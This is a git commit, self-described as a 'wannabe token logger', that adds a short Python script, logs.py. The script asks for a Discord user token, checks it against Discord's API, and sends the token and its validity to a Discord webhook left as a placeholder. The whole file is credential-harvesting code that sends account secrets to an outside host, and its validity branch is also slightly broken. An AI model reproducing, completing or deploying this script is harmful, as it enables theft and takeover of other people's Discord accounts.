0e4d24a7196767ad46a5b25aabf68972c688bd42
2vq <74454528+2vq@users.noreply.github.com>
2022-01-18 18:41:46 -0500

    wannabe token logger lololololol

---
+++ logs.py
@@ -0,0 +1,33 @@
+# ass code slaps :thumbsup:
+
+import requests
+import discord
+from dhooks import Webhook
+
+token = input(f'Discord Token -> ')
+client = discord.Client()
+
+link = f'https://discord.com/api/v9/users/@me'
+headers = {'Authorization': f'{token}'}
+codes = [200, 201, 204]
+api = f'webbhook link here'
+
+def checktoken():
+    r = requests.get(link, headers = headers)
+    if r.status_code in codes:
+        return 'Valid Token | User Token'
+    else:
+        return 'Invalid Token | Fake Token/Bot Token'
+tokentype = checktoken()
+if tokentype == 'Valid Token | User Token':
+    valid = f'True'
+elif tokentype == 'Invalid Token':
+    valid = f'False'
+def log():
+    webhook = Webhook(api)
+    webhook.send(f'''yaml
+[!] -> File Ran.
+Token Type: {tokentype}
+Token Entered: {token}
+Valid: {valid}''')
+log()
